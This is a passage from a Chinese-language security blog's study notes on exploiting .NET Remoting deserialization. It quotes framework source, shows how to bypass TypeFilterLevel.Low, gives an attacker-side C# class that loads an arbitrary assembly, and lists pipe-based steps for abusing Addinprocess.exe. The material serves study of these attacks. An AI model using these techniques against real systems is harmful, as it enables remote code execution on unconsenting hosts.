class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This is called when doing fix-ups during deserialization</span></span><br><span class="line">[<span class="meta">System.Security.SecurityCritical</span>]  <span class="comment">// auto-generated_required</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">virtual</span> Object <span class="title">GetRealObject</span>(<span class="params">StreamingContext context</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> GetRealObjectHelper();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// This is the common helper called by serialization / smuggling </span></span><br><span class="line">[<span class="meta">System.Security.SecurityCritical</span>]  <span class="comment">// auto-generated</span></span><br><span class="line"><span class="function"><span class="keyword">internal</span> Object <span class="title">GetRealObjectHelper</span>()</span></span><br><span class="line"> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Check if we are a result of serialiazing an MBR object</span></span><br><span class="line">    <span class="comment">// or if someone wanted to pass an ObjRef itself </span></span><br><span class="line">    <span class="keyword">if</span> (!IsMarshaledObject())</span><br><span class="line">    &#123;</span><br><span class="line">        BCLDebug.Trace(<span class="string">&quot;REMOTE&quot;</span>, <span class="string">&quot;ObjRef.GetRealObject: Returning *this*\n&quot;</span>);                </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Check if this is a lightweight objref</span></span><br><span class="line">        <span class="keyword">if</span>(IsObjRefLite())</span><br><span class="line">        &#123;</span><br><span class="line">            BCLDebug.Assert(<span class="literal">null</span> != uri, <span class="string">&quot;null != uri&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// transform the url, if this is a local object (we know it is local</span></span><br><span class="line">            <span class="comment">//   if we find the current application id in the url)</span></span><br><span class="line">            <span class="built_in">int</span> index = uri.IndexOf(RemotingConfiguration.ApplicationId);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// we need to be past 0, since we have to back up a space and pick up</span></span><br><span class="line">            <span class="comment">//   a slash.</span></span><br><span class="line">            <span class="keyword">if</span> (index &gt; <span class="number">0</span>)</span><br><span class="line">                uri = uri.Substring(index - <span class="number">1</span>);                   </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// In the general case, &#x27;this&#x27; is the </span></span><br><span class="line">        <span class="comment">// objref of an activated object</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">// It may also be a well known object ref ... which came by</span></span><br><span class="line">        <span class="comment">// because someone did a Connect(URL) and then passed the proxy</span></span><br><span class="line">        <span class="comment">// over to a remote method call.</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">// The below call handles both cases.</span></span><br><span class="line">        <span class="built_in">bool</span> fRefine = !(GetType() == <span class="keyword">typeof</span>(ObjRef));</span><br><span class="line">        Object ret = RemotingServices.Unmarshal(<span class="keyword">this</span>, fRefine);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Check for COMObject &amp; do some special custom marshaling</span></span><br><span class="line">        ret = GetCustomMarshaledCOMObject(ret);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>該接口方法用於在反序列化期間使用由該方法返回值替換物件。對於ObjRef，此方法導致調用<code>RemotingServices.Unmarshal(ObjRef, bool)</code>，它會使用反序列化后的ObjRef中指定的型別和目標URL創建一個RemotingProxy，當客戶端在這個代理上呼叫時，方法資訊和參數被打包成一個實作IMethodCallMessage的物件。這個物件被傳送到遠端進行處理，呼叫真實方法並將返回值(或異常)封裝在一個實作IMethodReturnMessage的物件中返回</p>
<p>也就是說所有擴展自MarshalByRefObject的物件都使用ObjRef按引用傳遞。並且在使用BinaryFormatter&#x2F;SoapFormatter反序列化ObjRef后(不僅限於 .NET Remoting)會導致創建RemotingProxy(類似於yso中的jrmpclient)</p>
<h3 id="Bypass-TypeFilterLevel-Low"><a href="#Bypass-TypeFilterLevel-Low" class="headerlink" title="Bypass TypeFilterLevel.Low"></a>Bypass TypeFilterLevel.Low</h3><p><img src="/2023/03/27/Learning-Exploit-of-NET-Remoting/image-20230322221351156.png" alt="image-20230322221351156"></p>
<p>然而remoting services的remoting services默認為TypeFilterLevel.Low，那麽又該如何bypass</p>
<p>再重新説明下TypeFilterLevel.Low的限制</p>
<blockquote>
<ul>
<li>Object types derived from <em>MarshalByRefObject</em>, <em>DelegateSerializationHolder</em>, <em>ObjRef</em>, <em>IEnvoyInfo</em> and <em>ISponsor</em> can not be deserialized. </li>
<li>All objects which are deserialized must not Demand any CAS permission other than <em>SerializationFormatter</em> permission.</li>
</ul>
</blockquote>
<p>限制有兩種，一種是CAS，另一種是類別限制</p>
<h5 id="CAS-permission"><a href="#CAS-permission" class="headerlink" title="CAS permission"></a>CAS permission</h5><p><a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#System.Runtime.Remoting/channels/sinks/binaryformattersinks.cs,d26976b2509a2eba,references">BinaryServerFormatterSink.ProcessMessage(sinkStack, requestMsg, requestHeaders, requestStream, responseMsg, responseHeaders, responseStream)</a></p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PermissionSet currentPermissionSet = <span class="literal">null</span>;                  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.TypeFilterLevel != TypeFilterLevel.Full) &#123;                    </span><br><span class="line"> currentPermissionSet = <span class="keyword">new</span> PermissionSet(PermissionState.None);                </span><br><span class="line"> currentPermissionSet.SetPermission(</span><br><span class="line">      <span class="keyword">new</span> SecurityPermission(</span><br><span class="line">          SecurityPermissionFlag.SerializationFormatter));                    </span><br><span class="line">&#125;</span><br><span class="line">                                    </span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (currentPermissionSet != <span class="literal">null</span>)</span><br><span class="line">  currentPermissionSet.PermitOnly();</span><br><span class="line">                        </span><br><span class="line"> <span class="comment">// Deserialize Request - Stream to IMessage</span></span><br><span class="line"> requestMsg = CoreChannel.DeserializeBinaryRequestMessage(</span><br><span class="line">    objectUri, requestStream, _strictBinding, <span class="keyword">this</span>.TypeFilterLevel);                    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (currentPermissionSet != <span class="literal">null</span>)</span><br><span class="line">  CodeAccessPermission.RevertPermitOnly();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>當前為<code>SecurityPermissionFlag.SerializationFormatter</code>，并且使用了<code>currentPermissionSet.PermitOnly();</code>意味著只能反序列化，其他諸如建立檔案都是不允许的</p>
<p>因爲在finally存在<code>CodeAccessPermission.RevertPermitOnly();</code>，可以理解爲解除了CAS Permitonly</p>
<p>也就是說只要在<code>CoreChannel.DeserializeBinaryRequestMessage</code>這一反序列化過程中不違反CAS就行，注意在這裏如果這時接收方獲取到ObjRef并且反序列化為RemotingProxy的時刻并不會直接觸發遠端連接，只有等到在對RemotingProxy的實際調用發生后才會建立遠端連接，所以說如果在此反序列化ObjRef是可行的</p>
<p><img src="/2023/03/27/Learning-Exploit-of-NET-Remoting/image-20230328215510611.png" alt="image-20230328215510611"></p>
<p>Call Stack中可以得知發生遠端調用(下面的紅色方框)這時已經是在<code>CodeAccessPermission.RevertPermitOnly();</code>后了</p>
<p>所以只需要在攻擊者端建立一個惡意類別并且擴展MarshalByRefObject並注冊，覆寫其中的方法使其被遠端調用后能夠返回自訂反序列化payload，這樣處理攻擊者返回的payload反序列化過程的將會移交給<a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#System.Runtime.Remoting/channels/sinks/binaryformattersinks.cs,ac233162405181a3">BinaryClientFormatterSink.DeserializeMessage(IMethodCallMessage mcm, ITransportHeaders headers, Stream stream)</a>處理，這個方法沒有保護</p>
<p>還有一個細節是對RemotingProxy的實際調用是如何發生的，如果傳遞給方法的引數不是所需類型的直接對應，<a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#mscorlib/system/runtime/remoting/stackbuildersink.cs,6b0d129cdbf4b59a,references">StackBuilderSink::SyncProcessMessage</a>將呼叫 <a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#mscorlib/system/runtime/remoting/message.cs,fee6cc27bdf5f8ba">Message::CoerceArgs</a>，嘗試將引數強制轉換為正確的類型。在這個Message::CoerceArgs中對於fall-back情況的處理是調用Convert::ChangeType，傳遞所需的類型和從客戶端傳遞的物件。接下來檢查傳遞的物件是否實作了IConvertible，並呼叫其中的ToType方法</p>
<p>所以説攻擊者只需要這樣</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">SerializerRemoteClass</span> : <span class="title">MarshalByRefObject</span>, <span class="title">IConvertible</span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">ToType</span>(<span class="params">Type conversionType, IFormatProvider provider</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Assembly user_assembly;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                user_assembly = Assembly.LoadFrom(<span class="string">&quot;TestAssembly.dll&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (user_assembly == <span class="literal">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;[!] Error loading provided assembly file. Error Message <span class="subst">&#123;ex.Message&#125;</span>:<span class="subst">&#123;ex.StackTrace&#125;</span>&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            PayloadClass Stage2_gadget = <span class="keyword">new</span> PayloadClass(user_assembly);</span><br><span class="line">            <span class="keyword">return</span> Stage2_gadget;</span><br><span class="line">        &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="類別限制"><a href="#類別限制" class="headerlink" title="類別限制"></a>類別限制</h5><p>最後的一個問題是如何繞過類別限制</p>
<p><a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#mscorlib/system/runtime/serialization/formatters/binary/binaryobjectreader.cs,b39110f56cef74c7">ObjectReader.CheckSecurity</a></p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">internal</span> <span class="keyword">void</span> <span class="title">CheckSecurity</span>(<span class="params">ParseRecord pr</span>)</span> &#123;</span><br><span class="line"> Type t = pr.PRdtType;</span><br><span class="line"> <span class="keyword">if</span> ((<span class="built_in">object</span>)t != <span class="literal">null</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(IsRemoting) &#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">typeof</span>(MarshalByRefObject).IsAssignableFrom(t))</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException();</span><br><span class="line">     FormatterServices.CheckTypeSecurity(t, formatterEnums.FEsecurityLevel);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#mscorlib/system/runtime/serialization/formatters/binary/binaryobjectreader.cs,c1d68558e521557c">ObjectReader</a></p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">bool</span> IsRemoting &#123;</span><br><span class="line">  <span class="keyword">get</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (bMethodCall || bMethodReturn);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#mscorlib/system/runtime/serialization/formatters/binary/binaryobjectreader.cs,be9595a18655dbec">ObjectReader.SetMethodCall</a></p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">internal</span> <span class="keyword">void</span> <span class="title">SetMethodCall</span>(<span class="params">BinaryMethodCall binaryMethodCall</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    bMethodCall = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">this</span>.binaryMethodCall = binaryMethodCall;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://referencesource.microsoft.com/#mscorlib/system/runtime/serialization/formatters/binary/binaryparser.cs,427">__BinaryParser.ReadMethodObject</a></p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">internal</span> <span class="keyword">void</span> <span class="title">ReadMethodObject</span>(<span class="params">BinaryHeaderEnum binaryHeaderEnum</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    SerTrace.Log( <span class="keyword">this</span>, <span class="string">&quot;ReadMethodObject&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (binaryHeaderEnum == BinaryHeaderEnum.MethodCall)</span><br><span class="line">    &#123;</span><br><span class="line">        BinaryMethodCall <span class="keyword">record</span> = <span class="keyword">new</span> BinaryMethodCall();</span><br><span class="line">        <span class="keyword">record</span>.Read(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">record</span>.Dump();</span><br><span class="line">        objectReader.SetMethodCall(<span class="keyword">record</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        BinaryMethodReturn <span class="keyword">record</span> = <span class="keyword">new</span> BinaryMethodReturn();</span><br><span class="line">        <span class="keyword">record</span>.Read(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">record</span>.Dump();</span><br><span class="line">        objectReader.SetMethodReturn(<span class="keyword">record</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>解決方式為手寫協議，不要將<code>MethodCall</code>或者<code>MethodReturn</code>作爲<code>top level record</code>即可，這一部分可以參考</p>
<p><a target="_blank" rel="noopener" href="https://github.com/tyranid/ExploitRemotingService">https://github.com/tyranid/ExploitRemotingService</a></p>
<p>接著是一個存在于real world中的簡單示例，僅僅使用到了前文提到的<code>Bypass DisableActivitySurrogateSelectorTypeCheck</code></p>
<h3 id="Addinprocess-exe"><a href="#Addinprocess-exe" class="headerlink" title="Addinprocess.exe"></a>Addinprocess.exe</h3><p>Addinprocess.exe存在於<code>X:\Windows\Microsoft.NET\Framework\v4.0.30319</code>(with Microsoft .NET installed) </p>
<p><strong>Add-ins</strong> 實際上是.NET Framework提供的一種插件模型，使開發人員能夠為其應用程序創建插件。此模型通過在主機和add-in之間構建通信管道來實現此目的</p>
<p><img src="/2023/03/27/Learning-Exploit-of-NET-Remoting/image-20230322230158389.png" alt="image-20230322230158389"></p>
<p>正如我們所看到的，需要提供&#x2F;guid:[GUID]參數和&#x2F;pid:[現有 PID]參數</p>
<p><strong>&#x2F;guid</strong>參數由你提供，並被用作IPC通道名稱。**&#x2F;pid**參數則是指一個已經運行的進程的進程識別號，<code>addinprocess.exe</code> 會等待其退出</p>
<p><img src="/2023/03/27/Learning-Exploit-of-NET-Remoting/image-20230322230324780.png" alt="image-20230322230324780"></p>
<p>接著，註冊.NET Remoting通道，可以看到<code>addinprocess.exe</code> 使用的是<code>TypeFilterLevel.Full</code></p>
<p><img src="/2023/03/27/Learning-Exploit-of-NET-Remoting/image-20230322221851861.png" alt="image-20230322221851861"></p>
<p>攻擊手法如下</p>
<ul>
<li>Addinprocess.exe <strong>&#x2F;guid</strong>:xxxxxxxx <strong>&#x2F;pid</strong>:xxxx(imma pid of explorer.exe)</li>
<li>type DisableActivitySurrogateSelectorTypeCheck.bin &gt; \.\pipe\xxxxxxxx</li>
<li>type ActivitySurrogateSelector.bin &gt; \.\pipe\xxxxxxxx</li>
</ul>
<h3 id="廢話收容所"><a href="#廢話收容所" class="headerlink" title="廢話收容所"></a>廢話收容所</h3><p>當作自己學習下面文章記錄的一篇學習筆記，方便回憶</p>
<p><a target="_blank" rel="noopener" href="https://codewhitesec.blogspot.com/2022/01/dotnet-remoting-revisited.html">https://codewhitesec.blogspot.com/2022/01/dotnet-remoting-revisited.html</a></p>
<p><a target="_blank" rel="noopener" href="https://labs.nettitude.com/blog/introducing-aladdin/">https://labs.nettitude.com/blog/introducing-aladdin/</a></p>

                            </section>
                        </div>
                        <input type="hidden" name="AdditionalItemDetailDefaultCssAndJs" value="true">
                    </div>
                </div>
            </section>
        <!-- ショップレビュー -->
        </div>
        <br class="clear">
    </div>
</div>
</body>
    <footer id="windowFooter">
    <nav id="info">
        <ul class="clearfix">
            <li><a class="windowFooterNav" href="/">HOME</a></li>
            <li class="pc"><a class="windowFooterNav" href="/">Privacy Policy</a></li>
            <li class="pc"><a class="windowFooterNav" href="/">Act on Specified Commercial Transactions</a></li>
            <li>
                <div class="socialBtnList clearfix boxRight">
                    <div class="fb sns">
                        <div class="fb-share-button" data-href="/" data-layout="button_count" data-size="small" data-mobile-iframe="true"><a class="fb-xfbml-parse-ignore" target="_blank" href="https://github.com/Siebene">Github</a></div>
                    </div>
                    <div class="tw sns">
                        <a target="_blank" rel="noopener" href="https://x.com/Siebene7" class="twitter-share-button" data-url="https://x.com/Siebene7" data-lang="ja" data-hashtags="" data-via="Siebene@" data-text="Siebene@ Blog">Twitter!</a>
                    </div>
                </div>
            </li>
        </ul>
    </nav>
</footer>
<input id="base_url" type="hidden" value="/">

<script type="text/javascript">
    $(function() {
        var imgs = $("#slideshow > li");
        var imgLen = imgs.length;
        var count = 0;
        function changeImg() {
            count = (count + 1) % imgLen;
            imgs.removeClass("showSlide").eq(count).addClass("showSlide");
        }
        setInterval(changeImg, 4000);
    })
</script>
</html>